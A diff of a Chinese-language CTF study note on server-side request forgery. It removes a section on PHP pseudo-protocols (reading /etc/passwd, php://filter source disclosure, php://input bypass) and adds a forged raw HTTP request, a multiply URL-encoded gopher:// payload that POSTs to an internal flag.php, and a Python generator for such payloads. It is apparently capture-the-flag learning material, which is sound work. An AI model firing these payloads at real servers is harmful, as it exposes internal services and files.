@@ -3,63 +3,6 @@ SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获
 
 SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器
 
-# PHP伪协议
-
-php支持的协议和封装协议
-
-### \file://文件绝对路径和文件名
-file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受配置文件中allow_url_fopen与allow_url_include的影响
-
-常用敏感路径：file:///var/www/html/index.php、file:/etc/passwd
-
-### dict://
-
-### php://
-使用条件(php.ini配置)：
-
-                                  allow_url_fopen	  allow_url_include
-php://input	                         on/off	                          on       （常用）
-php://stdin	                         on/off	                          on
-php://memory	                     on/off	                          on
-php://temp                           on/off	                          on
-php://filter	                         on/off	                        on/off      (常用)
-
-
-
-#### php://filter
-		名称                            	                 描述
-resource<--->要过滤的数据流	 这是个必要参数。它指定了你需要筛选过滤的数据流(简单来说就是你的数据来源)
-read<--->读链的筛选列表	        这个参数可选。可以设定一个或多个过滤器名称。以管道符（/）分隔
-write<--->读链的筛选列表	        这个参数可选。可以设定一个或多个过滤器名称。以管道符（/）分隔
-
-格式如下：
-读：php://filter/resource=文件名
- 
-php://filter/read=convert.base64-encode/resource=文件名(**常常**当源码不能直接被读取时，采用base64加密)
- 
-写：php://filter/resource=文件名&txt=文件内容
- 
-php://filter/write=convert.base64-encode/resource=文件名&txt=文件内容
-
-
-
-#### php://input
-                   ----可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。
-
-php://input是php语言中一个只读的数据流；通过"php://input"，可以读取从Http客户端以POST方式提交、请求头“Content-Type”值非"multipart/form-data​"的所有数据；"php://input"一般用来读取POST上来，除已被处理以外的剩余数据。
-
-说白了就是当遇到正则匹配时GET传参不能出现的敏感字符，可以通过php://input在POST上传最后绕过了检测
-
-```
-GET : index.php?cmd=php://input
- 
-POST : flag.php(目的数据)
-```
-
-data:// 协议和php://input作用相同，如果碰到input被过滤的情况可以用其替代
-
-zip://, bzip2://, **zlib://** 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名
-
 
 ## 文件扫描
 
@@ -69,11 +12,31 @@ zip://, bzip2://, **zlib://** 均属于压缩流，可以访问压缩文件�
 
 通过服务器访问内网地址，直接用bp爆破url传参中的端口即可：127.0.0.1:x
 
+## 发送包
+
+```
+当遇到
+$fp=fsockopen($host,intval($port),$error,$errstr,30);//建立socket连接
+fwrite($fp,$data);//写进我们的会话中的
+
+我们需要以http请求访问一个网站时，需要伪造请求头写入会话
+<?php
+$out = "GET /flag.php HTTP/1.1\r\n";
+$out .= "Host: 127.0.0.1\r\n";
+$out .= "Connection: Keep-Alive\r\n\r\n";
+echo $out;
+echo base64_encode($out)
+?>
+
+```
+
+
+
 ## POST请求（gopher协议）
 
-如果在x.php可以利用curl传url，那么我们可以用gopher协议在x.php中构造post请求包往flag.php传key值，以此获取flag
+如果在x.php可以利用curl传url（也支持http和file协议），那么我们可以用gopher协议在x.php中构造post请求包往flag.php传key值，以此获取flag
 
-gopher协议没有默认端口，需要特殊指定，而且需要指定POST方法，回车换行需要使用%0d%0a,而且POST参数之间的&分隔符也需要URL编码
+gopher协议默认端口为70，需要指定POST方法，回车换行需要使用%0d%0a,而且POST参数之间的&分隔符也需要URL编码
 ```
 POST /flag.php HTTP/1.1
 Host: 127.0.0.1:80
@@ -85,12 +48,54 @@ key=d93819c4c1a18dc606dc5c6486f77227
 gopher的数据需要用url编码多次之后再发送，且第一次编码后%0A需全部替换成%0D%0A，现在进行编码
 content-lenght为key值长度
 
-##### gopher使用结构gopher://127.0.0.1:80/_{TCP/IP数据流}
+**gopher使用结构gopher://127.0.0.1:80/_{TCP/IP数据流}**
+
+（下划线的原因是gopher协议回吃掉第一个url后的字符）
 
 以下为注入样例
 ```
-?url=http://127.0.0.1:80/index.php?url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D0bd5e192bb3c5e0f3df6b8ddf4252d9c
+url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D0bd5e192bb3c5e0f3df6b8ddf4252d9c
 ```
 
-因为curl在index.php中
+生成脚本
+
+```
+# -*- coding: UTF-8 -*-
+#coding: utf-8
+import urllib.parse
+s=''
+ss='''POST / HTTP/1.1
+Host: 127.0.0.1:80
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://node5.anna.nssctf.cn:28344
+Connection: close
+Referer: http://node5.anna.nssctf.cn:28344/
+Upgrade-Insecure-Requests: 1
+
+url=http://127.0.0.1/flag.php'''
+for i in ss:
+
+    if len(str(hex(ord(i))[2:]))>=2:
+        s+=str(hex(ord(i))[2:])
+    else:
+        s+='0'+str(hex(ord(i))[2:])
+s=s.replace('0a','0d0a')
+#print(s)
+
+strrr=''
+len=len(s)
+p=''
+for i in range(len)[::2]:
+    p+=urllib.parse.quote(chr(int(s[i:i+2],16)))
+    strrr+=chr(int(s[i:i+2],16))
+#print(strrr)
+urlp = urllib.parse.quote(p)
+urlp = 'gopher://127.0.0.1:80/_' + urlp
+print(urlp)
+```
 
